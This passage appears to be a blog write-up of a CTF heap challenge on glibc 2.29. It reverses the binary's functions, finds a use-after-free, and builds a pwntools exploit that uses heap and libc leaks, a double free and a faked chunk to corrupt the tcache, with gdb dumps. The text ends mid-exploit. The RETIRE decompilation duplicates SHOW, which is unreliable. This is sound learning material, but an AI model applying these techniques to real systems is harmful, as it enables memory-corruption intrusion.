@@ -1,0 +1,507 @@
+I"��<p>This challenge is something we really missed out during the actual CTF , but happens that now Im about to give an intended solution for this challenge after quite sometime.</p>
+
+<p><strong>PS</strong> This writeup is purely for my own learning and I’d be really happy if this is useful to you too :P.</p>
+
+<p class="notice">I will not be discussing about the bug in this post as I have already discussed that in my <a href="https://pwnverse.github.io/HouseOfLore/">previous post</a>.</p>
+
+<p>Anyways , let’s dive into some tcache exploitation now.</p>
+
+<h2 id="tldr">TL;DR</h2>
+
+<p>We’ve been given the binary file and glibc 2.29 to start with.</p>
+
+<p>Running <code class="language-plaintext highlighter-rouge">file</code> command , we see that it’s <code class="language-plaintext highlighter-rouge">x86 64 bit</code> standard CTF-style binary.</p>
+
+<p>Let’s see what <code class="language-plaintext highlighter-rouge">checksec</code> has to tell us.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+</code></pre></div></div>
+
+<h2 id="reversing">Reversing</h2>
+
+<p>Firing up the binary in <strong>IDA</strong> , we see that the binary has menu-styled layout with the following functions.</p>
+
+<ul>
+  <li><strong>DEBUT</strong> - This function does the following
+    <ol>
+      <li>Reads the <code class="language-plaintext highlighter-rouge">unsigned long</code> idx and checks if it is less than 2.</li>
+      <li>Reads <strong>Hero Name</strong> and checks if the length of name is in the range of <strong>[0x7f,0x400]</strong>.</li>
+      <li>Has bss tables for storing Heap addresses of calloc’d chunks and the size.</li>
+      <li>Finally , it copies our input onto the heap address with the use of <code class="language-plaintext highlighter-rouge">strncpy</code>.</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">print</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">);</span>
+  <span class="n">idx</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"invalid"</span><span class="p">);</span>
+  <span class="n">print</span><span class="p">(</span><span class="s">"hero name: "</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400uLL</span><span class="p">);</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x400uLL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"io"</span><span class="p">);</span>
+  <span class="n">s</span><span class="p">[</span><span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x7F</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x400</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"poor hero name"</span><span class="p">);</span>
+  <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">heroes</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">)</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1uLL</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+  <span class="n">sizes</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+  <span class="n">strncpy</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">heroes</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">),</span> <span class="n">s</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400uLL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>RENAME</strong> - This function is like any other standard safe edit functions which checks for <code class="language-plaintext highlighter-rouge">idx</code> and then reads into the location which the idx points to using the sizes table for calculating size.</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">print</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">);</span>
+  <span class="n">idx</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"invalid"</span><span class="p">);</span>
+  <span class="n">print</span><span class="p">(</span><span class="s">"hero name: "</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400uLL</span><span class="p">);</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x400uLL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"io"</span><span class="p">);</span>
+  <span class="n">s</span><span class="p">[</span><span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x7F</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x400</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"poor hero name"</span><span class="p">);</span>
+  <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">heroes</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">)</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1uLL</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+  <span class="n">sizes</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+  <span class="n">strncpy</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">heroes</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">),</span> <span class="n">s</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400uLL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>SHOW</strong> - This function prints the contents of the chunks by reading idx.</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>
+
+  <span class="n">print</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">);</span>
+  <span class="n">idx</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"invalid"</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">heroes</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">print</span><span class="p">(</span><span class="s">"hero name: "</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">heroes</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">));</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>RETIRE</strong> - This function frees the chunk but does not NULL out the pointer in bss, hence we have <strong>Use After Free</strong> bug which could leverage us memory leaks.</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]</span>
+
+  <span class="n">print</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">);</span>
+  <span class="n">idx</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"invalid"</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">heroes</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">print</span><span class="p">(</span><span class="s">"hero name: "</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">heroes</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">));</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>SECRET</strong> - This is the function where a <strong>malloc</strong> call of 0x217 happens. To trigger this function , we need to fill the 0x217 tcache with atleast 6 chunks and hence we can <em>malloc only if the tcache bins of size 0x217 are 6 or more</em>.</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">qword_4030</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">6</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"gg"</span><span class="p">);</span>
+  <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x217uLL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"err"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x217uLL</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"io"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Serious Punch!!!"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_2128</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Fair Enough , now that we have a grasp of what the binary does , let’s try exploiting it and spawn a shell :).</p>
+
+<h2 id="exploit-development">Exploit Development</h2>
+
+<p>We begin with defining functions for doing necessary stuff for us.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"./one_punch_loaded"</span><span class="p">,</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">})</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">noptrace</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"name: "</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'4'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"idx: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">secret</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span><span class="s">'50056'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="memory-leaks">Memory Leaks</h3>
+
+<h4 id="notice">NOTICE</h4>
+<p class="notice">Calloc calls do not take from tcache.</p>
+
+<p>Heap Leak is just one step away , we simply add 2 chunks , free both and view the second chunk added.</p>
+
+<p>For Libc Leak , we can simply fill a smallbin size tcache ,then add another chunk and free it , thus creating one unsorted bin chunk which has it’s fd and bk pointers in libc bss <code class="language-plaintext highlighter-rouge">main_arena</code> struct.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">'0'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">'1'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">#Heap
+</span><span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'name: '</span><span class="p">)</span>
+<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x260</span>
+
+<span class="c1">#Fill 0x217 tcache
+</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">'2'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">'2'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">'3'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span> <span class="c1">#Padding
+#This time in unsorted bin
+</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1">#Libc
+</span><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"hero name: "</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x219ca0</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Libc -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+</code></pre></div></div>
+
+<p>We have the necessary leaks now , let’s dive into some core exploitation :P.</p>
+
+<p>Since we can <code class="language-plaintext highlighter-rouge">edit</code> free chunks also , we can easily <code class="language-plaintext highlighter-rouge">double_free</code> without crashing.</p>
+
+<p>As we completely filled the 0x220 tcache , let us call <code class="language-plaintext highlighter-rouge">malloc</code> and consume one tcache , add another chunk of size 0x217 , free it and this chunk would silently fill back tcache without top consolidation.</p>
+
+<p>The subsequent calloc call gives us the chunk that we had previously sent to unsorted bin.</p>
+
+<p>Let us have a look at memory dump at each step from now on , for better understanding.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secret('a')
+add(0,'T'*0x217)
+free(0)
+</code></pre></div></div>
+<p>After freeing that chunk , we yet again fill the tcache of 0x217.</p>
+
+<p>Now we erase <code class="language-plaintext highlighter-rouge">fd</code> and <code class="language-plaintext highlighter-rouge">bk</code> of this freed chunk and simply free it again without crashing.</p>
+
+<p>This time , the same chunk goes into unsorted bin as it doesnt have any other choice  :thinking:.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  
+</code></pre></div></div>
+
+<p>Now that we performed double free , let’s observe the memory once.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+0x55555555a130:	0x0032323232323232	0x0000000000000221 -&gt; This chunk is both <span class="k">in </span>tcache and main_arena unsorted bin
+0x55555555a140:	0x00007ffff7fefca0	0x00007ffff7fefca0
+0x55555555a150:	0x5454545454545454	0x5454545454545454
+
+
+0x555555559150:	0x000055555555a140   -&gt; This is tcache arena , <span class="nb">let </span>us call this victim chunk where we want to get allocation
+0x7ffff7fefcb0 <span class="nt">--</span><span class="o">&gt;</span> 0x55555555a130    -&gt; This is main arena
+</code></pre></div></div>
+
+<p>Interestingly , we have the same [almost] chunk available in unsorted bin as well as tcache , the only difference being the way tcache and main_arena manage chunks , but then , we can fake that unsorted bin chunk and make it appear like the tcache chunk.</p>
+
+<p>For that , let’s extend the top chunk by adding 3 chunks of size 0x217 and freeing them all , thus sending a huge chunk into unsorted bin and merging with top.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="s">'E'</span><span class="o">*</span><span class="mh">0x217</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Let’s examine the heap.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+0x55555555a570:	0x0033333333333333	0x000000000001fa91 -&gt; Notice how all chunks merged with top
+0x55555555a580:	0x000055555555a130	0x00007ffff7fefca0
+</code></pre></div></div>
+
+<p>Now its time to create chunk of size 0x400 and have a fake chunk of size 0x220 inside it.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x221</span><span class="p">)</span>          <span class="c1">#Faking a chunk of size 0x221 [which is the chunk allocated at a request of 0x217 also]
+</span><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x150</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span>   <span class="c1">#Using the victim chunk to bypass fd and bk checks
+</span><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x150</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">fake_chunk</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x210</span><span class="p">,</span><span class="s">'F'</span><span class="p">)</span> <span class="c1">#Filling up the fake chunk
+</span><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x220</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x600</span><span class="p">)</span>     <span class="c1">#Why 0x600? Let's see!
+</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x400</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">fake_chunk</span><span class="p">)</span>
+
+</code></pre></div></div>
+<p>Let’s see how this setup looks in the memory.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>
+0x55555555a570:	0x0033333333333333	0x0000000000000411 -&gt; This is the chunk of size 0x400 that we added
+0x55555555a580:	0x0000000000000000	0x0000000000000211 -&gt; This is the fake free chunk we created 
+0x55555555a590:	0x0000555555559138	0x0000555555559140 -&gt; fd and bk have been <span class="nb">set </span>to point to victim
+0x55555555a5a0:	0x4646464646464646	0x4646464646464646
+0x55555555a5b0:	0x4646464646464646	0x4646464646464646
+0x55555555a5c0:	0x4646464646464646	0x4646464646464646
+0x55555555a5d0:	0x4646464646464646	0x4646464646464646
+0x55555555a5e0:	0x4646464646464646	0x4646464646464646
+0x55555555a5f0:	0x4646464646464646	0x4646464646464646
+0x55555555a600:	0x4646464646464646	0x4646464646464646
+0x55555555a610:	0x4646464646464646	0x4646464646464646
+0x55555555a620:	0x4646464646464646	0x4646464646464646
+0x55555555a630:	0x4646464646464646	0x4646464646464646
+0x55555555a640:	0x4646464646464646	0x4646464646464646
+0x55555555a650:	0x4646464646464646	0x4646464646464646
+0x55555555a660:	0x4646464646464646	0x4646464646464646
+0x55555555a670:	0x4646464646464646	0x4646464646464646
+0x55555555a680:	0x4646464646464646	0x4646464646464646
+0x55555555a690:	0x4646464646464646	0x4646464646464646
+0x55555555a6a0:	0x4646464646464646	0x4646464646464646
+0x55555555a6b0:	0x4646464646464646	0x4646464646464646
+0x55555555a6c0:	0x4646464646464646	0x4646464646464646
+0x55555555a6d0:	0x4646464646464646	0x4646464646464646
+0x55555555a6e0:	0x4646464646464646	0x4646464646464646
+0x55555555a6f0:	0x4646464646464646	0x4646464646464646
+0x55555555a700:	0x4646464646464646	0x4646464646464646
+0x55555555a710:	0x4646464646464646	0x4646464646464646
+0x55555555a720:	0x4646464646464646	0x4646464646464646
+0x55555555a730:	0x4646464646464646	0x4646464646464646
+0x55555555a740:	0x4646464646464646	0x4646464646464646
+0x55555555a750:	0x4646464646464646	0x4646464646464646
+0x55555555a760:	0x4646464646464646	0x4646464646464646
+0x55555555a770:	0x4646464646464646	0x4646464646464646
+0x55555555a780:	0x4646464646464646	0x4646464646464646
+gdb-peda<span class="nv">$ </span>
+0x55555555a790:	0x0000000000000210	0x0000000000000600  -&gt; Another chunk of 0x600 <span class="nb">set </span>up to trick malloc into thinking that previous chunk is free
+0x55555555a7a0:	0x6161616161616161	0x6161616161616161
+0x55555555a7b0:	0x6161616161616161	0x6161616161616161
+0x55555555a7c0:	0x6161616161616161	0x6161616161616161
+0x55555555a7d0:	0x6161616161616161	0x6161616161616161
+0x55555555a7e0:	0x6161616161616161	0x6161616161616161
+0x55555555a7f0:	0x6161616161616161	0x6161616161616161
+0x55555555a800:	0x6161616161616161	0x6161616161616161
+0x55555555a810:	0x6161616161616161	0x6161616161616161
+0x55555555a820:	0x6161616161616161	0x6161616161616161
+0x55555555a830:	0x6161616161616161	0x6161616161616161
+0x55555555a840:	0x6161616161616161	0x6161616161616161
+0x55555555a850:	0x6161616161616161	0x6161616161616161
+0x55555555a860:	0x6161616161616161	0x6161616161616161
+0x55555555a870:	0x6161616161616161	0x6161616161616161
+0x55555555a880:	0x6161616161616161	0x6161616161616161
+0x55555555a890:	0x6161616161616161	0x6161616161616161
+0x55555555a8a0:	0x6161616161616161	0x6161616161616161
+0x55555555a8b0:	0x6161616161616161	0x6161616161616161
+0x55555555a8c0:	0x6161616161616161	0x6161616161616161
+0x55555555a8d0:	0x6161616161616161	0x6161616161616161
+0x55555555a8e0:	0x6161616161616161	0x6161616161616161
+0x55555555a8f0:	0x6161616161616161	0x6161616161616161
+gdb-peda<span class="nv">$ </span>
+0x55555555a900:	0x6161616161616161	0x6161616161616161
+0x55555555a910:	0x6161616161616161	0x6161616161616161
+0x55555555a920:	0x6161616161616161	0x6161616161616161
+0x55555555a930:	0x6161616161616161	0x6161616161616161
+0x55555555a940:	0x6161616161616161	0x6161616161616161
+0x55555555a950:	0x6161616161616161	0x6161616161616161
+0x55555555a960:	0x6161616161616161	0x6161616161616161
+0x55555555a970:	0x6161616161616161	0x0061616161616161
+gdb-peda<span class="nv">$ </span>
+0x55555555a980:	0x0000000000000000	0x000000000001f681   -&gt; This is the top chunk
+
+</code></pre></div></div>
+
+<p>It is also very interesting to see the bss table where our chunks are stored based on their indices.</p>
+
+<p>Now adding another chunk of size 0x400 and free the chunk which had the fake chunk , thus corrupting the size of fake chunk we created with a large heap address.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add(2,cyclic(0x400)) #Also preventing top consolidation
+free(1)
+</code></pre></div></div>
+<p>This is how the heap looks with our fake chunk’s size overwritten with tcache heap address.</p>
+
